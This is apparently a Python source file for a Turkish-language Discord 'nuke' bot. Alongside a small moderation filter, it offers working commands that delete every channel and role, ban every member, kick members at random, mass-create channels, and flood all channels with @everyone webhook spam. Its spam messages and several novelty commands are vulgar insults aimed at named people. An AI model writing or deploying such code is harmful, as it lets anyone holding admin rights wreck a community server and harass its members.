import discord
from discord.ext import commands
import asyncio
import os
import random
import aiohttp
import io
import json
import time
from datetime import datetime, timedelta
from PIL import Image, ImageDraw, ImageFont
from flask import Flask
from threading import Thread

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot aktif!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

intents = discord.Intents.all()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

spam_aktif = False
silme_aktif = False
GUARD_AKTIF = False

# Rate limit koruması
KULLANICI_SON_ISLEM = {}
SPAM_KONTROL = {}

# ========================================
# RATE LİMİT KORUMASI
# ========================================

def rate_limit_kontrol(user_id):
    now = time.time()
    if user_id in KULLANICI_SON_ISLEM:
        if now - KULLANICI_SON_ISLEM[user_id] < 1:
            return False
    KULLANICI_SON_ISLEM[user_id] = now
    return True

# ========================================
# GUARD FONKSİYONLARI
# ========================================

async def spam_kontrol(message):
    if not GUARD_AKTIF:
        return False
    
    user_id = message.author.id
    now = time.time()
    
    if user_id in SPAM_KONTROL:
        if now - SPAM_KONTROL[user_id] < 5:
            return False
    SPAM_KONTROL[user_id] = now
    
    if user_id not in KULLANICI_SON_ISLEM:
        KULLANICI_SON_ISLEM[user_id] = []
    
    KULLANICI_SON_ISLEM[user_id] = [t for t in KULLANICI_SON_ISLEM[user_id] if now - t < 5]
    KULLANICI_SON_ISLEM[user_id].append(now)
    
    if len(KULLANICI_SON_ISLEM[user_id]) > 5:
        try:
            await message.delete()
            await message.author.timeout(timedelta(minutes=1), reason="Spam")
            await message.channel.send(f"{message.author.mention} spam yaptığın için 1 dakika susturuldun.")
            return True
        except:
            pass
    return False

async def kufur_kontrol(message):
    if not GUARD_AKTIF:
        return False
    YASAKLI_KELIMELER = ["aptal", "salak", "manyak", "gerizekalı", "mala", "amk", "sg", "siktir", "orospu", "pezevenk", "göt", "yarrak", "amcık"]
    for kelime in YASAKLI_KELIMELER:
        if kelime in message.content.lower():
            try:
                await message.delete()
                await message.channel.send(f"{message.author.mention} yasaklı kelime kullandın.")
                return True
            except:
                pass
    return False

async def link_kontrol(message):
    if not GUARD_AKTIF:
        return False
    YASAKLI_LINKLER = ["discord.gg/", "https://", "http://", ".com", ".net", ".org"]
    for link in YASAKLI_LINKLER:
        if link in message.content.lower():
            try:
                await message.delete()
                await message.channel.send(f"{message.author.mention} link paylaşmak yasak.")
                return True
            except:
                pass
    return False

def yikim_engeli():
    async def predicate(ctx):
        if GUARD_AKTIF:
            await ctx.send("Guard aktif. Yıkım komutları kapalı.")
            return False
        return True
    return commands.check(predicate)

# ========================================
# OLAYLAR
# ========================================

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name="!yardım"))
    print(f'✅ Bot hazır: {bot.user}')

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    if not rate_limit_kontrol(message.author.id):
        return
    
    if await spam_kontrol(message):
        return
    if await kufur_kontrol(message):
        return
    if await link_kontrol(message):
        return
    
    await bot.process_commands(message)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Yetkin yetmiyor, otur ağla.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"Eksik argüman. Doğru kullanım: `{ctx.command.name} {ctx.command.signature}`")
    else:
        print(f"Hata: {error}")
        await ctx.send(f"Hata: {str(error)[:100]}")

# ========================================
# GUARD KOMUTU
# ========================================

@bot.command()
@commands.has_permissions(administrator=True)
async def guard(ctx, durum: str = None):
    global GUARD_AKTIF
    if durum is None:
        await ctx.send(f"Guard {'aktif' if GUARD_AKTIF else 'pasif'}.")
        return
    if durum.lower() == "on":
        GUARD_AKTIF = True
        await ctx.send("Guard aktif. Yıkım komutları kapalı.")
    elif durum.lower() == "off":
        GUARD_AKTIF = False
        await ctx.send("Guard pasif. Yıkım komutları açık.")
    else:
        await ctx.send("!guard on veya !guard off yaz.")

def adam_ascii(can):
    ascii_art = [
        """
        +---+
        |   |
            |
            |
            |
            |
        =========
        """,
        """
        +---+
        |   |
        O   |
            |
            |
            |
        =========
        """,
        """
        +---+
        |   |
        O   |
        |   |
            |
            |
        =========
        """,
        """
        +---+
        |   |
        O   |
       /|   |
            |
            |
        =========
        """,
        """
        +---+
        |   |
        O   |
       /|\\  |
            |
            |
        =========
        """,
        """
        +---+
        |   |
        O   |
       /|\\  |
       /    |
            |
        =========
        """,
        """
        +---+
        |   |
        O   |
       /|\\  |
       / \\  |
            |
        =========
        """
    ]
    return ascii_art[6 - can] if 0 <= can <= 6 else ascii_art[0]

async def birlestir_avatar(ctx, kisi1, kisi2, yuzde):
    async with aiohttp.ClientSession() as session:
        async with session.get(kisi1.avatar.url) as resp1:
            img1_data = await resp1.read()
        async with session.get(kisi2.avatar.url) as resp2:
            img2_data = await resp2.read()
    
    img1 = Image.open(io.BytesIO(img1_data)).convert("RGBA")
    img2 = Image.open(io.BytesIO(img2_data)).convert("RGBA")
    size = (200, 200)
    img1 = img1.resize(size, Image.LANCZOS)
    img2 = img2.resize(size, Image.LANCZOS)
    canvas = Image.new("RGBA", (500, 300), (30, 30, 30, 255))
    canvas.paste(img1, (30, 30))
    canvas.paste(img2, (270, 30))
    
    kalp = Image.open("heart.png") if os.path.exists("heart.png") else None
    if kalp:
        kalp = kalp.resize((60, 60), Image.LANCZOS)
        canvas.paste(kalp, (220, 100), kalp)
    else:
        draw = ImageDraw.Draw(canvas)
        draw.text((220, 120), "❤️", fill="red")
    
    draw = ImageDraw.Draw(canvas)
    try:
        font = ImageFont.truetype("arial.ttf", 20)
    except:
        font = ImageFont.load_default()
    draw.text((30, 250), kisi1.display_name[:12], fill="white", font=font)
    draw.text((270, 250), kisi2.display_name[:12], fill="white", font=font)
    draw.text((210, 200), f"{yuzde}%", fill="yellow", font=font)
    
    output = io.BytesIO()
    canvas.save(output, format="PNG")
    output.seek(0)
    return output

# ========================================
# YIKIM KOMUTLARI
# ========================================

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def sl(ctx):
    global silme_aktif
    if silme_aktif:
        await ctx.send("Silme işlemi zaten aktif.")
        return
    silme_aktif = True
    await ctx.send("Kanallar siliniyor... !sildur ile durdur.")
    for kanal in ctx.guild.channels:
        if not silme_aktif:
            break
        try:
            await kanal.delete()
            await asyncio.sleep(0.3)
        except:
            pass
    silme_aktif = False
    await ctx.send("Kanallar silindi.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def sildur(ctx):
    global silme_aktif
    silme_aktif = False
    await ctx.send("Silme durduruldu.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def slhepsi(ctx):
    await ctx.send("Tüm kanallar tek seferde siliniyor...")
    kanallar = ctx.guild.channels
    basarili = 0
    basarisiz = 0
    for kanal in kanallar:
        try:
            await kanal.delete()
            basarili += 1
        except:
            basarisiz += 1
    await ctx.send(f"{basarili} kanal silindi. {basarisiz} kanal silinemedi.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def spamwebhook(ctx):
    global spam_aktif
    if spam_aktif:
        await ctx.send("Spam zaten aktif.")
        return
    await ctx.send("Webhook'lar oluşturuluyor...")
    webhooklar = []
    for kanal in ctx.guild.text_channels:
        try:
            webhook = await kanal.create_webhook(name="SpamBot")
            webhooklar.append(webhook)
        except:
            pass
    if not webhooklar:
        await ctx.send("Hiçbir kanala webhook oluşturulamadı.")
        return
    spam_aktif = True
    await ctx.send(f"{len(webhooklar)} webhook ile spam başladı. !dur ile durdur.")
    sayac = 0
    while spam_aktif:
        for i in range(0, len(webhooklar), 5):
            if not spam_aktif:
                break
            grup = webhooklar[i:i+5]
            tasks = []
            for webhook in grup:
                tasks.append(webhook.send("@everyone Valdo/Klowinc Siker .d", username="Valdo/Klowinc"))
            await asyncio.gather(*tasks, return_exceptions=True)
            sayac += len(grup)
            await asyncio.sleep(0.3)
        if sayac % 50 == 0:
            await ctx.send(f"{sayac} mesaj gönderildi.")
    for webhook in webhooklar:
        try:
            await webhook.delete()
        except:
            pass
    await ctx.send(f"Spam durduruldu. Toplam {sayac} mesaj gönderildi.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def spam(ctx):
    global spam_aktif
    if spam_aktif:
        await ctx.send("Spam zaten aktif.")
        return
    spam_aktif = True
    await ctx.send("Spam başladı. !dur ile durdur.")
    while spam_aktif:
        tasks = []
        for kanal in ctx.guild.text_channels:
            tasks.append(kanal.send("@everyone Valdo/Klowinc Siker .d"))
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.5)

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def spamyavas(ctx):
    global spam_aktif
    if spam_aktif:
        await ctx.send("Spam zaten aktif.")
        return
    spam_aktif = True
    await ctx.send("Yavaş spam başladı. !dur ile durdur.")
    while spam_aktif:
        for kanal in ctx.guild.text_channels:
            if not spam_aktif:
                break
            try:
                await kanal.send("@everyone Valdo/Klowinc Siker .d")
            except:
                pass
        await asyncio.sleep(0.5)

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def dur(ctx):
    global spam_aktif
    spam_aktif = False
    await ctx.send("Spam durduruldu.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def roluştur(ctx, *, isim):
    try:
        rol = await ctx.guild.create_role(name=isim)
        await ctx.send(f"{rol.name} adlı rol oluşturuldu.")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def rolsil(ctx, rol: discord.Role):
    try:
        await rol.delete()
        await ctx.send(f"{rol.name} adlı rol silindi.")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def rolver(ctx, member: discord.Member, rol: discord.Role):
    try:
        await member.add_roles(rol)
        await ctx.send(f"{member.mention} adlı kişiye {rol.name} rolü verildi.")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def rolat(ctx, member: discord.Member, rol: discord.Role):
    try:
        await member.remove_roles(rol)
        await ctx.send(f"{member.mention} adlı kişiden {rol.name} rolü alındı.")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def everyone(ctx, *, mesaj):
    await ctx.send(f"@everyone {mesaj}")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def dm(ctx, member: discord.Member, *, mesaj):
    try:
        await member.send(mesaj)
        await ctx.send(f"{member.mention} adlı kişiye DM gönderildi.")
    except:
        await ctx.send(f"{member.mention} adlı kişiye DM gönderilemedi.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def kanalkilit(ctx):
    for kanal in ctx.guild.text_channels:
        try:
            await kanal.set_permissions(ctx.guild.default_role, send_messages=False)
        except:
            pass
    await ctx.send("Kanallar kilitlendi.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def kanalaç(ctx):
    for kanal in ctx.guild.text_channels:
        try:
            await kanal.set_permissions(ctx.guild.default_role, send_messages=None)
        except:
            pass
    await ctx.send("Kanallar açıldı.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def kanaloluştur(ctx, *, isim):
    try:
        await ctx.guild.create_text_channel(isim)
        await ctx.send(f"{isim} adlı kanal oluşturuldu.")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def kanalsil(ctx, kanal: discord.TextChannel):
    try:
        await kanal.delete()
        await ctx.send(f"{kanal.name} adlı kanal silindi.")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def kategorisil(ctx, kategori_adi: str):
    kategori = discord.utils.get(ctx.guild.categories, name=kategori_adi)
    if not kategori:
        await ctx.send("Böyle bir kategori bulunamadı.")
        return
    sayac = 0
    for kanal in kategori.channels:
        try:
            await kanal.delete()
            sayac += 1
        except:
            pass
    await kategori.delete()
    await ctx.send(f"{kategori_adi} kategorisi ve {sayac} kanal silindi.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def tumrollersil(ctx):
    sayac = 0
    for rol in ctx.guild.roles:
        if rol.name == "@everyone":
            continue
        try:
            await rol.delete()
            sayac += 1
        except:
            pass
    await ctx.send(f"{sayac} rol silindi.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def sunucubosalt(ctx):
    await ctx.send("Tüm üyeler banlanıyor...")
    sayac = 0
    for member in ctx.guild.members:
        if member == ctx.author or member == ctx.guild.me:
            continue
        try:
            await member.ban(reason="Sunucu boşaltma")
            sayac += 1
        except:
            pass
    await ctx.send(f"{sayac} üye banlandı.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def rastgeleat(ctx, sayi: int = 1):
    uyeler = [uye for uye in ctx.guild.members if not uye.bot and uye != ctx.author]
    if len(uyeler) < sayi:
        await ctx.send("Yeterli üye yok.")
        return
    secilen = random.sample(uyeler, sayi)
    sayac = 0
    for uye in secilen:
        try:
            await uye.kick(reason="Rastgele atma")
            sayac += 1
        except:
            pass
    await ctx.send(f"{sayac} üye atıldı.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def kanalpatlat(ctx, sayi: int, *, isim: str = "patlama"):
    await ctx.send(f"{sayi} kanal oluşturuluyor...")
    sayac = 0
    for i in range(sayi):
        try:
            await ctx.guild.create_text_channel(f"{isim}-{i+1}")
            sayac += 1
            await asyncio.sleep(0.2)
        except:
            pass
    await ctx.send(f"{sayac} kanal oluşturuldu.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def sunucuismi(ctx, *, yeni_isim):
    try:
        await ctx.guild.edit(name=yeni_isim)
        await ctx.send(f"Sunucu ismi {yeni_isim} olarak değiştirildi.")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def servericon(ctx):
    if not ctx.message.attachments:
        await ctx.send("Lütfen bir resim dosyası gönder.")
        return
    dosya = ctx.message.attachments[0]
    if not dosya.content_type.startswith('image/'):
        await ctx.send("Lütfen geçerli bir resim dosyası gönder.")
        return
    try:
        resim = await dosya.read()
        await ctx.guild.edit(icon=resim)
        await ctx.send("Sunucu profil fotoğrafı değiştirildi.")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def servername(ctx, *, yeni_isim):
    try:
        await ctx.guild.edit(name=yeni_isim)
        await ctx.send(f"Sunucu ismi {yeni_isim} olarak değiştirildi.")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def sıfırla(ctx):
    await ctx.send("Sunucu sıfırlanıyor... 10 saniye içinde evet yaz.")
    def onay_kontrol(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "evet"
    try:
        await bot.wait_for('message', timeout=10.0, check=onay_kontrol)
    except asyncio.TimeoutError:
        await ctx.send("İşlem iptal edildi.")
        return
    await ctx.send("SIFIRLANIYOR...")
    for kanal in ctx.guild.channels:
        try:
            await kanal.delete()
        except:
            pass
    for rol in ctx.guild.roles:
        if rol.name != "@everyone":
            try:
                await rol.delete()
            except:
                pass
    for member in ctx.guild.members:
        if member != ctx.author and member != ctx.guild.me:
            try:
                await member.ban()
            except:
                pass
    await ctx.guild.edit(name="SIFIRLANDI")
    await ctx.send("Sunucu sıfırlandı.")

# ========================================
# YEDEKLEME KOMUTLARI
# ========================================

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def sunucuyedekle(ctx):
    await ctx.send("Sunucu yedekleniyor...")
    veri = {
        "sunucu_ismi": ctx.guild.name,
        "sunucu_id": ctx.guild.id,
        "kategoriler": [],
        "kanallar": [],
        "roller": []
    }
    for kat in ctx.guild.categories:
        veri["kategoriler"].append({
            "isim": kat.name,
            "id": kat.id,
            "konum": kat.position
        })
    for kanal in ctx.guild.channels:
        if isinstance(kanal, discord.TextChannel) or isinstance(kanal, discord.VoiceChannel):
            veri["kanallar"].append({
                "isim": kanal.name,
                "id": kanal.id,
                "tip": "text" if isinstance(kanal, discord.TextChannel) else "voice",
                "konum": kanal.position,
                "kategori_id": kanal.category.id if kanal.category else None
            })
    for rol in ctx.guild.roles:
        veri["roller"].append({
            "isim": rol.name,
            "id": rol.id,
            "renk": str(rol.color),
            "konum": rol.position,
            "yetkiler": rol.permissions.value
        })
    dosya_adi = f"yedek_{ctx.guild.id}.json"
    with open(dosya_adi, "w", encoding="utf-8") as f:
        json.dump(veri, f, indent=2, ensure_ascii=False)
    await ctx.send(file=discord.File(dosya_adi))
    os.remove(dosya_adi)
    await ctx.send("Sunucu yedeklendi.")

@bot.command()
@commands.has_permissions(administrator=True)
@yikim_engeli()
async def yedektenyukle(ctx):
    if not ctx.message.attachments:
        await ctx.send("Lütfen bir yedek JSON dosyası gönder.")
        return
    dosya = ctx.message.attachments[0]
    if not dosya.filename.endswith('.json'):
        await ctx.send("Lütfen geçerli bir JSON dosyası gönder.")
        return
    await ctx.send("Sunucu geri yükleniyor...")
    try:
        veri = await dosya.read()
        yedek = json.loads(veri)
        await ctx.guild.edit(name=yedek["sunucu_ismi"])
        yeni_roller = {}
        for rol_verisi in yedek["roller"]:
            try:
                renk = discord.Color(int(rol_verisi["renk"].replace("#", ""), 16))
                yeni_rol = await ctx.guild.create_role(
                    name=rol_verisi["isim"],
                    color=renk,
                    permissions=discord.Permissions(rol_verisi["yetkiler"])
                )
                yeni_roller[rol_verisi["id"]] = yeni_rol
                await asyncio.sleep(0.2)
            except:
                pass
        yeni_kategoriler = {}
        if "kategoriler" in yedek:
            for kat_verisi in yedek["kategoriler"]:
                try:
                    kat = await ctx.guild.create_category(kat_verisi["isim"])
                    yeni_kategoriler[kat_verisi["id"]] = kat
                    await asyncio.sleep(0.2)
                except:
                    pass
        for kanal_verisi in yedek["kanallar"]:
            try:
                kategori = yeni_kategoriler.get(kanal_verisi.get("kategori_id"))
                if kanal_verisi["tip"] == "text":
                    await ctx.guild.create_text_channel(kanal_verisi["isim"], category=kategori)
                elif kanal_verisi["tip"] == "voice":
                    await ctx.guild.create_voice_channel(kanal_verisi["isim"], category=kategori)
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send("Sunucu geri yüklendi.")
    except Exception as e:
        await ctx.send(f"Hata: {e}")

# ========================================
# EĞLENCE KOMUTLARI
# ========================================

@bot.command()
async def valdo(ctx):
    await ctx.send("YARRAMM VALDO BU KIM AMK")

@bot.command()
async def gonu(ctx):
    await ctx.send("2 GUNDE 48 CK ATAN ADAM")

@bot.command()
async def eternal(ctx):
    await ctx.send("FURKANIN NAMIDEGER BABASI")

@bot.command()
async def klowinc(ctx):
    await ctx.send("BU ADAMIN TASSAKLARINA BETON YETMEZ")

@bot.command()
async def doruk(ctx):
    await ctx.send("ARİEL BABAAAA")

@bot.command()
async def atam(ctx):
    try:
        await ctx.send(file=discord.File('ataturk.jpg'))
    except:
        await ctx.send("ataturk.jpg bulunamadı.")

@bot.command()
async def furkandomalma(ctx):
    try:
        await ctx.send(file=discord.File('furkandomalma.jpg'))
    except:
        await ctx.send("furkandomalma.jpg bulunamadı.")

@bot.command()
async def furkanvideo(ctx):
    try:
        await ctx.send(file=discord.File('furkan.mp4'))
    except:
        await ctx.send("furkan.mp4 bulunamadı.")

@bot.command()
async def zar(ctx):
    sonuc = random.randint(1, 6)
    zar_emoji = ["⚀", "⚁", "⚂", "⚃", "⚄", "⚅"]
    await ctx.send(f"Zar: {sonuc} {zar_emoji[sonuc-1]}")

@bot.command()
async def ping(ctx):
    await ctx.send(f"Pong! {round(bot.latency * 1000)}ms")

@bot.command()
async def yardım(ctx):
    await ctx.send(
        "Komutlar:\n"
        "!guard on/off - Guard'ı aç/kapat\n"
        "!sl - Kanalları sil\n"
        "!sildur - Silmeyi durdur\n"
        "!slhepsi - Tüm kanalları tek seferde sil\n"
        "!spamwebhook - Webhook ile spam\n"
        "!spam - Spam başlat\n"
        "!spamyavas - Yavaş spam\n"
        "!dur - Spam durdur\n"
        "!rololuştur <isim> - Rol oluştur\n"
        "!rolsil <@rol> - Rol sil\n"
        "!rolver <@kisi> <@rol> - Rol ver\n"
        "!rolat <@kisi> <@rol> - Rol al\n"
        "!everyone <mesaj> - @everyone mesajı\n"
        "!dm <@kisi> <mesaj> - DM gönder\n"
        "!kanalkilit - Kanalları kilitle\n"
        "!kanalaç - Kanalları aç\n"
        "!kanaloluştur <isim> - Kanal oluştur\n"
        "!kanalsil <#kanal> - Kanal sil\n"
        "!kategorisil <kategori> - Kategori sil\n"
        "!tumrollersil - Tüm rolleri sil\n"
        "!sunucubosalt - Tüm üyeleri banla\n"
        "!rastgeleat <sayı> - Rastgele üye at\n"
        "!kanalpatlat <sayı> - Kanal patlat\n"
        "!sunucuismi <isim> - Sunucu ismini değiştir\n"
        "!servericon - Sunucu ikonunu değiştir\n"
        "!servername <isim> - Sunucu ismini değiştir\n"
        "!sıfırla - Sunucuyu sıfırla\n"
        "!sunucuyedekle - Sunucuyu yedekle\n"
        "!yedektenyukle - Yedekten geri yükle\n"
        "!valdo - Valdo mesajı\n"
        "!gonu - Gonu mesajı\n"
        "!eternal - Eternal mesajı\n"
        "!klowinc - Klowinc mesajı\n"
        "!doruk - Doruk mesajı\n"
        "!atam - Atatürk resmi\n"
        "!furkandomalma - Furkan domalma resmi\n"
        "!furkanvideo - Furkan video\n"
        "!zar - Zar at\n"
        "!ping - Gecikme"
    )

# ========================================
# BAŞLATMA
# ========================================

if __name__ == "__main__":
    Thread(target=run_web).start()
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        bot.run(token)
    else:
        print("❌ DISCORD_TOKEN ayarlanmamış.")